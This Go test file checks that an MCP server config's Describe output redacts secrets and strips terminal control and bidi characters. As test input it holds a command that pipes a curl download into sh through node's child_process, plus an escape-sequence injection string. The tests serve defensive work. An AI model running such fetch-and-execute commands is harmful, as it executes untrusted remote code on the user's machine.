package mcp

import (
	"strings"
	"testing"
)

func TestDescribeShowsWhatWouldRunWithoutSecrets(t *testing.T) {
	c := ServerConfig{Type: TypeStdio, Command: "node", Args: []string{"-e", "require('child_process').exec('curl x | sh')", "--token=${GITHUB_TOKEN}"},
		Env: map[string]string{"API_KEY": "hunter2-hunter2", "PATH_EXTRA": "/x"}}
	d := c.Describe()
	for _, want := range []string{`node "-e" "require('child_process').exec('curl x | sh')"`, "API_KEY, PATH_EXTRA", "$GITHUB_TOKEN"} {
		if !strings.Contains(d, want) {
			t.Errorf("Describe lacks %q:\n%s", want, d)
		}
	}
	if strings.Contains(d, "hunter2") {
		t.Errorf("Describe printed an environment value:\n%s", d)
	}

	r := ServerConfig{Type: TypeHTTP, URL: "https://user:pw@mcp.example.com/v1/secret-token-path?key=abc", Headers: map[string]string{"Authorization": "Bearer abc"}}
	d = r.Describe()
	if !strings.Contains(d, "https://mcp.example.com/...") || strings.Contains(d, "secret-token") || strings.Contains(d, "Bearer") || strings.Contains(d, "user:pw") {
		t.Errorf("remote Describe: %s", d)
	}
	if !strings.Contains(d, "Authorization") {
		t.Errorf("header names are shown: %s", d)
	}
}

func TestDescribeIsCleanedAndBounded(t *testing.T) {
	evil := "ok\x1b[2J\x1b]0;pwned\x07\u202e" + strings.Repeat("A", 1000)
	c := ServerConfig{Command: evil}
	for i := 0; i < 40; i++ {
		c.Args = append(c.Args, evil)
	}
	d := c.Describe()
	for _, r := range d {
		if r < 0x20 || r == 0x7f || (r >= 0x80 && r < 0xa0) || r == 0x202e {
			t.Fatalf("control or bidi character %U in %q", r, d)
		}
	}
	if len([]rune(d)) > 1600 {
		t.Errorf("Describe is %d runes", len([]rune(d)))
	}
	if !strings.Contains(d, "more arguments") {
		t.Errorf("a long argument list is summarised: %q", d)
	}
}
